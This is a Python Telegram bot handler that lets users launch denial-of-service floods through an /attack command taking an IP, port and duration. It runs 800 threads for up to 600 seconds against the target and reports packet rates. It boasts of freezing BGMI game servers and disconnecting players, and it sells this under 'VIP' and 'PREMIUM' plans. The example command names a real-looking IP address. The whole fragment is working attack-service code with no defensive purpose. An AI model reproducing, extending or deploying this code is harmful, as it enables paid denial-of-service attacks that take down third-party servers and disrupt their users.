@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    global attacking, attack_info
    
    user_id = message.from_user.id
    user = get_user(user_id)
    
    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(message, """
⚠️ **Invalid Format**

Use: /attack IP PORT TIME

Example:
/attack 20.204.191.48 10335 180
""", parse_mode='Markdown')
        return
    
    if attacking:
        bot.reply_to(message, "⚠️ Attack already running! Use /stop")
        return
    
    ip = parts[1]
    try:
        port = int(parts[2])
    except:
        bot.reply_to(message, "❌ Invalid port!")
        return
    try:
        dur = int(parts[3])
    except:
        bot.reply_to(message, "❌ Invalid time!")
        return
    
    # 🔥 FIXED - RAILWAY SAFE THREADS
    if dur > 600:
        dur = 600
    
    # 🔥 RAILWAY MAX THREADS
    threads = 800  # ✅ SAFE
    
    attack_info = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
    attacking = True
    
    def run_attack():
        global attacking
        try:
            stats = attacker.start(ip, port, dur, threads)
            attacking = False
            
            update_user(user_id, {'$inc': {'total_attacks': 1}})
            
            result_text = f"""
💀 **SERVER FREEZE COMPLETE!**

╔══════════════════════════╗
║ 🎯 Target: {ip}:{port}
║ 📦 Packets: {stats['pkts']:,}
║ 📶 Speed: {stats['mbps']:.1f} Mbps
║ ⚡ Rate: {stats['pps']:.0f} pps
║ ⏱️ Duration: {stats['duration']}s
╚══════════════════════════╝

📸 **"Match server response timed out"**
🔥 **Players disconnected!**
✅ **BGMI Server Freeze Confirmed!**

🔄 /attack IP PORT TIME
"""
            bot.send_message(user_id, result_text, parse_mode='Markdown')
            
        except Exception as e:
            attacking = False
            bot.send_message(user_id, f"❌ Attack Failed: {e}")
    
    Thread(target=run_attack).start()
    
    reply_text = f"""
💀 **ATTACK LAUNCHED**

╔══════════════════════════╗
║ 🎯 Target: {ip}:{port}
║ ⏱️ Duration: {dur}s
║ 🧵 Threads: {threads}
║ 👤 User: {user_id}
║ ⚡ Method: VIP-ULTRA
║ 💎 Plan: PREMIUM
╚══════════════════════════╝

🔥 BGMI Server Freeze Started!
📸 "Match server response timed out" - Soon!

🛑 Use /stop to abort
"""
    bot.reply_to(message, reply_text, parse_mode='Markdown')
